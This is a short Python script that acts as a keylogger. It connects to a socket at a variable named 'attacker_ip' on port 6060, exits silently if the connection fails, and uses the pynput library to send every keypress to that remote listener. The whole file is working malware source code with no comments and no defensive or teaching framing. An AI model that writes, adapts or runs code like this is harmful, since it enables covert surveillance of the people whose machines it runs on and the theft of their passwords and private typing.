import socket 
import pynput
import sys
attacker_ip = '0.0.0.0'
attacker_port = 6060
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((attacker_ip,attacker_port))
except:
    sys.exit()

def send_keystroke(key):
    key_str = str(key).replace("'", '')
    s.send(key_str.encode('utf-8'))
    
with pynput.keyboard.Listener(on_press=send_keystroke) as listener:
    listener.join()
